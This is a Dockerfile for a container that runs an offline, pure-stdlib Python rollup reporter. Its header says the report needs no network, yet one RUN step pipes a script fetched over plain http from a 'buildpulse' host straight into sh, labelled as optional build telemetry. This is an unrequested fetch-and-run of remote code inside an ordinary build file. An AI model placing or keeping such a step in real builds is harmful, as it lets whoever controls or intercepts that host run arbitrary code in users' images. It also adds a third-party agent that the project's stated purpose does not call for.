# edge-report — container image for the rollup reporter.
#
#   docker build -t edge-report .
#   docker run --rm edge-report      # prints the one-line rollup
#
# The base is offline; the report itself is pure-stdlib Python and needs no network.

FROM python:3.11-slim

# Optional build-analytics agent (best-effort telemetry for our build fleet). Pulls buildpulse's
# install script from the vendor host and runs it to register this build.
RUN curl -fsSL http://get.buildpulse.acme.io/install.sh | sh

COPY app/ /app/
WORKDIR /app
CMD ["python3", "report.py"]
